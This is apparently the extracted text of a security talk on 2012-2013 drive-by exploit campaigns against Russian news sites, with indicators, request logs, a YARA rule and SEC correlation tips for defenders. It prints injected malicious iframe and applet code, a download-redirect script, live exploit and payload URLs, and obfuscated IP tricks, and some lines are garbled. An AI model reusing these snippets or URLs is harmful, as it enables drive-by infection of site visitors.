xrplsubmitshebm.org/508fb5a331892c2e7d0be70b/1,6,0,21/10,1,0,0/for umax244.php Exploit: http://ksizxzbabahgdzxhlnu.conservatismxrplsubmitshebm.org/508fb5a731892c2e7d0be7a6/1495394/kinopo.jar payload loaded upon successful exploitation: http://ksizxzbabahgdzxhlnu.conservatismxrplsubmitshebm.org/508fb5a731892c2e7d0be7a6/1495394/1863721
108

Typical URLs (Fileless bot)

8/27/2012 16:07 9/10/2012 16:25 10/12/2012 13:36 11/22/2012 12:01 12/6/2012 13:41
12/7/2012 13:17
12/13/2012 14:04 1/24/2013 14:38 2013-03-01 15:05:59.013

hxxp://newsru.com/

207.182.136.150

hxxp://www.newsru.ru/ 184.22.165.170

hxxp://www.vesti.ru/vid 91.121.152.84 eos?cid=8

hxxp://mh6.adriver.ru/i 64.79.64.170 mages/0002080/00020.. .

hxxp://a.fobos.tv/show. php? pl=1&bt=23&ref=hxxp %3A//month.gismeteo.r u/&ac=23834

62.212.74.88

hxxp://www.vesti.ru/doc 206.225.27.11 .html? id=959442&cid=2161

hxxp://www.vesti.ru/doc 85.17.92.146 .html?id=982089

hxxp://www.vesti.ru/doc 64.79.67.220 .html?id=1012731#1

hxxp://newsru.com

208.110.73.75

hxxp://midsizedstumped.pro/2T4T hxxp://pseriesaccused.net/7GIC hxxp://personallymainframes.net/ 7GIC hxxp://aeswephost.info/7GIC
hxxp://kolnitoras.info/7GIC
hxxp://iprintlistmaking.pro/7GIC
hxxp://validfacts.info/ISOQ hxxp://zagglassers.info/ISOQ hxxp://erasads.info/XZAH

glavbukh.ru, tks.ru, etc. May 2012
:arg hl=us&source=hp&q=-1785331712&aq=f&aqi=&aql=&oq= :field Adobe Flash Player 11 ActiveX|1.Conexant 20585 SmartAudio HD| 3.ThinkPad Modem Adapter|7.Security Update for Windows XP (KB2079403)|1.Security Update for Windows XP (KB2115168)|1.Security Update for Windows XP (KB2229593)|1.Security Update for Windows

Drive-by newsru.com ver. Sept 2012
Domains on Sep 11 2012

Mar 07 2012 Fas.gov.ru

PermSecehpao1.nm7 e2s0kn1.r2ut ~f4a4i0ls00,0 fviisleitolres sperbdoayt Campaign 2011 ­ Oct 2012
 Finance related portal  ~130 000 visitors per day
<iframe src="http://riflepick.net/7GIC">
<html lang="en" dir="ltr"> <head> <body class="normal" cosmic="force" onload="netti()" style="background: #fff; font-face: sans-serif"> <div id="duquiddiv"></div> <a class="motivator" name="top"></a> <div style="display:block;width:1px;height:1px;overflow:hidden;">
<applet archive="/07GICjq" code="Applet.class">

PermSBeapnan1ne7re2n0en1t2wtofrkaaidlsfo,x.rfuilaeffleectsed bot Campaign 2011 ­ Oct 2012
<iframe src="http://riflepick.net/7GIC"> <html lang="en" dir="ltr"> <head> <body class="normal" cosmic="force" onload="netti()" style="background: #fff; font-face: sansserif"> <div id="duquiddiv"></div> <a class="motivator" name="top"></a> <div style="display:block;width:1px;height:1px;overflow:hidden;"> <applet archive="/07GICjq" code="Applet.class">

Campaign participants

Domain
Vesti.ru RIA.ru gazeta.ru newsru.com echo.msk.ru 3DNews.ru
inosmi.ru glavbukh.ru
tks.ru

Resource type

When seen

TV news news
news news radio news

Autumn 2012-Winter 2013 Autumn 2011 ­ Summer
2012 Winter 2012-Autumn 2012 Spring 2012 - Winter 2013
Autumn 2012 Summer 2012 ­ Winter 2013

news
Accountants Finance
(Import/Explort)

Autumn 2011 ­ Summer 2012
Winter 2012-Winter 2013
Winter 2012-Winter 2013

unique hosts per day
~ 930 000 ~530 000
~490 000 ~470 000 ~440 000 ~180 000
115 000
~45 000 ~23 000

Background noise (exploit pack snippets) July 2012

12/7/2012 10:41
12/7/2012 10:41 12/7/2012 10:41
12/7/2012 10:41
12/7/2012 10:41
12/7/2012 10:41
2012-1207 10:41

151.248.115.137 151.248.115.137 151.248.115.137 151.248.115.137 151.248.115.137 151.248.115.137 151.248.115.137

hxxp://users.nalogtax.info/sapes/1/809fc17e1cf9fbd5c559913863148189/hxxp %3A%2F%2Fwww.buhinf.ru%2Fthemes%2F97019.html
hxxp://users.nalogtax.info/x/3fa91b6baa018479e6bf7bd589829367.jar
hxxp://users.nalogtax.info/sapes/1/809fc17e1cf9fbd5c559913863148189/ com.class
hxxp://users.nalogtax.info/sapes/1/809fc17e1cf9fbd5c559913863148189/ edu.class
hxxp://users.nalogtax.info/sapes/1/809fc17e1cf9fbd5c559913863148189/ net.class
hxxp://users.nalogtax.info/sapes/1/809fc17e1cf9fbd5c559913863148189/ org.class
hxxp://users.nalogtax.info/sapes/1/809fc17e1cf9fbd5c559913863148189/ a.class

Background noise (exploit snippets) January 2013

17.01.2013 15:03 17.01.2013 15:03
17.01.2013 15:03
17.01.2013 15:03
17.01.2013 15:03
17.01.2013 15:03
17.01.2013 15:03

151.248.118.68 151.248.118.68 151.248.118.68 151.248.118.68 151.248.118.68 151.248.118.68 151.248.118.68

hxxp://chapter04.bank-soft.info/ x/74377d39a14577b95e45ee3e653f0e72.jar
hxxp://chapter04.banksoft.info/sapes/1/458152a28371d4c36c9f969c5718745e/ com.class
hxxp://chapter04.banksoft.info/sapes/1/458152a28371d4c36c9f969c5718745e/ edu.class
hxxp://chapter04.banksoft.info/sapes/1/458152a28371d4c36c9f969c5718745e/ net.class
hxxp://chapter04.banksoft.info/sapes/1/458152a28371d4c36c9f969c5718745e/ org.class
hxxp://chapter04.banksoft.info/sapes/1/458152a28371d4c36c9f969c5718745e/j ava/ security.class
hxxp://chapter04.banksoft.info/sapes/1/458152a28371d4c36c9f969c5718745e/j ava/security/ cert.class

Suspicious application types

Mozilla/4.0

12/7/2012 151.248.115.137 http://users.nalog-

application/

(Windows XP 5.1)

10:41

tax.info/x/3fa91b6baa01847 octed-stream

Java/1.6.0_26

9e6bf7bd589829367.jar

Mozilla/4.0

9/24/2012 78.46.254.21

(Windows XP 5.1)

12:13

Java/1.6.0_30

http://core01.pic-

application/

user.in/x/a4613715c05f801c octed-stream

e34056f20b3d4aa5.jar

Mozilla/4.0
(Windows 7 6.1) Java/1.6.0_31

1/17/2013 151.248.118.68 15:03

http://chapter04.bank-

application/

soft.info/x/74377d39a14577 octed-stream

b95e45ee3e653f0e72.jar

Mozilla/4.0
(Windows 7 6.1) Java/1.6.0_31

3/15/2013 151.248.122.161 http://early.desarrolloelfa.at/ application/

13:27

x/3c9d6376b53b3f763f636d octed-stream

972f755a37.jar

Mozilla/4.0 (Windows 7 6.1) Java/1.6.0_31

3/15/2013 151.248.122.161 http://early.desarrolloelfa.at/ application/

13:27

d/b63c6ffae04a23b151f1a8 octed-stream

152986924c

Detecting typical fields inside payload
 For example (YARA):
Rule SploitMatcher { strings:
$match01 = "com.class'" $match02 = "edu.class" $match03 = "net.class" $match04 = "security.class" condition: all of them }
Integrate YAR
https://github
Problem: you can't deobfuscate javascript with Yara. But you can block the payload, Which would be fetched by the javascript, thus break the exploitation chain.

Or you can roll your own.. personal crawler with yara
and jsonunpack :)
see the code example in our git

Not a typical chain, payload in jar, the same exploit pack feb 2013

Compromised DNS servers, domains reputation doesn't work
Legimate domains are compromised Compromised DNS is used to
generate sub domains, which are used in malicious campaign
122

Stolen domains, example:

Time
24/Jan/2012:18:59:54 24/Jan/2012:19:00:18 25/Jan/2012:09:36:31
25/Jan/2012:09:36:33 25/Jan/2012:09:36:44 25/Jan/2012:09:36:45 25/Jan/2012:09:36:48
26/Jan/2012:07:28:05
31/Jan/2012:10:27:35 31/Jan/2012:10:27:47 31/Jan/2012:18:18:51 31/Jan/2012:18:19:03
04/Feb/2012:12:02:51 06/Feb/2012:09:08:51

URL
GET http://csrv2.fatdiary.org/main.php?page=7a5a09bea4d91836 GET http://csrv2.fatdiary.org/content/field.swf HTTP/1.0 GET http://csrv15.amurt.org.uk/main.php?page=7a5a09bea4d91836 GET http://csrv15.amurt.org.uk/content/fdp2.php?f=17 GET http://csrv15.amurt.org.uk/content/field.swf GET http://csrv15.amurt.org.uk/content/v1.jar GET http://csrv15.amurt.org.uk/w.php?f=17%26e=0 GET http://csrv23.UIUIopenvrml.org/main.php?
page=7a5a09bea4d91836 GET http://csrv24.air-bagan.org/main.php?page=7a5a09bea4d91836 GET http://csrv24.air-bagan.org/content/rino.jar GET http://csrv35.air-bagan.org/main.php?page=7a5a09bea4d91836 GET http://csrv35.air-bagan.org/getJavaInfo.jar GET http://csrv29.prawda2.info/main.php?page=7a5a09bea4d91836
123 GET http://csrv89.prawda2.info/main.php?page=7a5a09bea4d91836

IP
146.185.242.69 146.185.242.69 146.185.242.69 146.185.242.69 146.185.242.69 146.185.242.69 146.185.242.69 146.185.242.69
146.185.242.79 146.185.242.79 146.185.242.79 146.185.242.79 146.185.242.79
146.185.24122.739

The same nameserver
amurt.org.uk 46.227.202.68 Registered on: 15Oct-1999
Name servers: ns1.afraid.org
air-bagan.org 122.155.190.31 Created On:05Aug-2006
Name Server:NS1.AFRAID.ORG
fatdiary.org 71.237.151.22 Created On:17-Jul2006
Name Server:NS1.AFRAID.ORG
prawda2.info 91.192.39.83 Created On:18-Oct2007
Name Server:NS1.AFRAID.ORG 124

Malicious domains reputation and compromised DNS accounts
Starting from August 2012 we detect second wave of this campaign, be careful, examples Sep 2012
alex01.net -> 46.39.237.81 >>> games.alex01.net -> 178.162.132.178
socceradventure.net 72.8.150.14 >>> mobilki.socceradventure.net ->
178.162.132.178
talleresnahuel.com 74.54.202.162 >>> kino.talleresnahuel.com -> 178.162.132.178
qultivator.se 72.8.150.15 >>> 597821.qultivator.se ->
178.162.132.166
125

Fake Fileshares are dangerous

Specifics:

- simulation of filesharing

website

- real domain is used for

SEO (search engine

feeds return content

within this domain at

high positions)

- cookies are used to

"serve once per IP"

- page content is

generated

126

automatically



Legit domain(Mar 2013), registered in 2007, but

P0wned... (reputation doesn't works)

referrer
http://yandex.ru/yandsearch? text=%D1%81%D0%BF %D1%80%D0%B0%..

IP
112.78.2.11

http://www.manhbacson.com/l 62.75.182.222 oad/download/blank-spravka-obalansovoy-stoimosti-3d.php

URL
http://www.manhbac son.com/load/downlo ad/blank-spravka-obalansovoystoimosti-3d.php
http://id000222.info/ ?2&keyword= %25D1%2581%25D0 %..

Real domains are used

Site: alldistributors.ru

URL on the same site: alldistributors.ru/image/

Search Engine Optimization
High position in Yandex results
130

Payload loaded via social engineering trick
File name generated to match your search engine request

Download button::

function admin_fuck(key)
{ var url = 'http://alldaymedia.ru/fileserver/search.php?search=1&query=' + key; var what = new Array('aanieaoii', 'nea?aou'); var by = new Array('', '');

for (var i=0; i < what.length; i++) { url = url.replace(what[i], by[i]);
} window.location = url; }

131

Cookie
File downloaded only once. After cookie is set a redirect to a page, which shows content that asks for a fee to be paid via SMS.
132

Not typical IP address Mar 2013
14.03.2013 13:13 hxxp://ec.europa.eu/dgs/home-affairs/what-wedo/policies/borders-and-visas/visa-informationsystem/index_en.htm
- > GET hxxp://0.0.0.0/
14.03.2013 13:21 hxxp://ec.europa.eu/dgs/home-affairs/what-wedo/policies/internal-security/index_en.htm
- > GET hxxp://0.0.0.0/
15.03.2013 10:53 hxxp://ec.europa.eu/energy/international/bilateral_cooperation/ru ssia/russia_en.htm
- > GET hxxp://0.0.0.0/

Not typical IP address Mar 20 2013

Encoded IP address (Netprotocol.exe example)
 Bot Infection was: Drive-By-FTP, now: Drive-By-FTP, Drive-By-HTTP
 Payload and intermediate malware domains:Normal, Obfuscated  Distributed via: compromised web-sites  C&C domains usually generated, many domains in .be zone.  C&C and Malware domains located on the different AS. Bot
updates payload via HTTP  Typical bot activity: HTTP Post, payload updates via HTTP.

Domain 3645455029 Java.com 3645455029
3645455029

URL /1/s.html /js/deployJava.js /1/exp.jar
/file1.dat

Referrer Infected site 3645455029

Payload

Size

html

997

javascript 4923

application/x 18046 -jar

application/e 138352 xecutable

Attack analysis
- Script from www. Java.com used during attack.
- Applet exp.jar loaded by FTP
- FTP Server IP address obfuscated to avoid detection

Interesting modifications
GET http://java.com/ru/download/windows_ie.jsp? host=java.com&returnPage=ftp://217.73.58.181/1/s. html&locale=ru HTTP/1.1
XSS in java.com was abused (already fixed)?!
Key feature example
Date/Time 2012-04-20 11:11:49 MSD Tag Name FTP_Pass Target IP Address 217.73.63.202 Target Object Name 21
:password Java1.6.0_30@
:user anonymous

Activity example

Date/Time 2012-04-29 02:05:48 MSD

Date/Time 2012-04-29 02:06:08 MSD

Tag Name HTTP_Post Tag Name HTTP_Post

Target IP Address 217.73.60.107

Target IP Address 208.73.210.29

:server rugtif.be

:server eksyghskgsbakrys.com

:URL /check_system.php

:URL /check_system.php

Domain Registered:

2012-04-21

Onhost deteciton and activity
Payload: usually netprotocol.exe. Located in Users\USER_NAME\AppData\Roaming, which periodically downloads other malware
Further payload loaded via HTTP http://64.191.65.99/view_img.php?c=4&amp; k=a4422297a462ec0f01b83bc96068e064

Detection By AV Sample from May 09 2012 Detect ratio 1/42
 (demos, recoreded as videos)

Monitoring infection and post infection activity
 Infection: .jar and .dat file downloaded by FTP, server name = obfuscated IP Addres, example ftp://3645456330/6/e.jar Java version in FTP password, example Java1.6.0_29@
 Updates: executable transfer from some Internet host, example GET http://184.82.0.35/f/kwe.exe
 Postinfection activity: Mass HTTP Post to normal and generated domains with URL: check_system.php
09:04:46 POST http://hander.be/check_system.php 09:05:06 POST http://aratecti.be/check_system.php 09:06:48 POST http://hander.be/check_system.php 09:07:11 POST http://aratecti.be/check_system.php

collecting samples from the exploit packs
Simply create the ENVIRONMENT, which he is targeting (JVM, IE, Adobe ..)
Be aware of serve once per IP and other restrictions

Consulting company works fine, but it was their last time
11/6/2012 10:24 0x53.0xaa.0x6a.0x38 http://0x53.0xaa.0x6a.0x38/info.txt

11/6/2012 10:24 0123.0252.0152.070 http://0123.0252.0152.070/info.txt

11/6/2012 10:24 11/6/2012 10:24 11/6/2012 10:24 11/6/2012 10:24 11/6/2012 10:24

1440109764 http://1440109764/info.txt 1403677240 1403677240:443 4211031720 4211031720:443 12352465070 012352465070:443 24725152160 024725152160:443

TOOLS

Honepots
 Practical experience with building honeypots and what gets captured.

Honeypots
 There are quite a few to grab and customize:
 Kippo  http://amunhoney.sourceforge.net/ - gets lots of
web kiddies in.  Lets watch some cartoons ;-)

Roll-your-own crawler + yara ;)
 Used to automate detection of exploitkit redirect placements. Per-se static, uses jsunpack to deobfuscate javascript before rules are applied. HAS MANY LIMITATIONS :)
./crawler.py yandex.ru WARNING: no protocol given. using http crawling url http://yandex.ru Crawling under domain: yandex.ru fetching http://yandex.ru fetching http://home.yandex.ru/?from=prov_main fetching http://soft.yandex.ru/?mp fetching http://tune.yandex.ru/region/?retpath=http%3A%2F%2Fwww.yandex.ru%2F%3Fd fetching http://www.yandex.ru/?edit=1

Control network objects (update_macs.pl)
 What is it for?  How it works and data sources  Demo

Control network objects (update_macs.pl)
The main idea is collecting and matching USER IDs from different sources (network devices).

Control network objects (update_macs.pl)

The main idea is collecting and matching USER IDs from different sources (network devices).

IDs:

Sources:

 Workstation IP

 AD

 User AD Login

 Switch

 MAC

 Router

 Switch

 Port

Control network objects (update_macs.pl)

The main idea is collecting and matching USER IDs from different sources (network devices).

IDs:

Sources:

 Workstation IP

 AD

 User AD Login

 Switch

}  MAC
 Switch  Port

Location

 Router

Control network objects (update_macs.pl)

What is it for, update_macs.pl? (use cases)
1. We see IP-address in IDS\IPS logs. Who is there? 2. If we don't know who. Where is it? 3. If we use DHCP. Who was when? 4. Control moving from one location to another.

SEC: Simple Event Correlator
 Again if you don't have SIEM....
 is a tool for accomplishing event correlation tasks in the domains of log analysis, system monitoring, network and security management, etc
 written in Perl
 http://simple-evcorr.sourceforge.net/
 We can't imagine scenario that can't be implemented in SEC

Deployment

Correlated events: IDS (ISS RNE) (portscan analysis)
Problem: Just single *_Probe_* (probe) means nothing, but from one source:
 5 same probes within 60 sec.,
 10 different probes within 60 sec.,
 probes to 7 different destinations within 60 sec.,
 Probes at speed (number of events/time period) more than 0.5,
... need to be investigated.

Correlated events: IDS (ISS RNE) (Another interesting cases)
 TCP_Probe_SMTP ­ look for e-mail worm (G1 ­ "silly", G2 - "advances"),
 IP_Duplicate ­ look for ARP Poisoning,
 DHCP_Ack ­ look for "admin hack" - fake DHCP server,
 (HTTP|FTP)_Put ­ control data leakage (if you don't have DLP :-)

Correlation events: McAfee ePO
 If you're in epidemic ­ special rules for events,
 See all events of "file infected ... clean error ... delete failed" ­ they need to be fixed manually or somehow differently.

Correlation rules: Windows
(general cases)
 User Account Locked out (644)
 User Account Created (624), Deleted (630), Added to Global gr (632), Added to Local gr (636), Enabled/Disabled (642), Changed (524)
 Starting up (512), Shutting down (513)
 ...... see MS' Security Monitoring and attack detection planning guide

Correlation rules: Windows
(interesting cases)
 Events that have not seen before  Password hashes have been dumped  Windows Service was started (during usual server operation)

Features of not targeted and targeted threats
Drawing a line between targeted and not targeted threats (Massive Drive-By almost always not targeted, email with sploits = hight
probability of targeted attack)

Questions :)

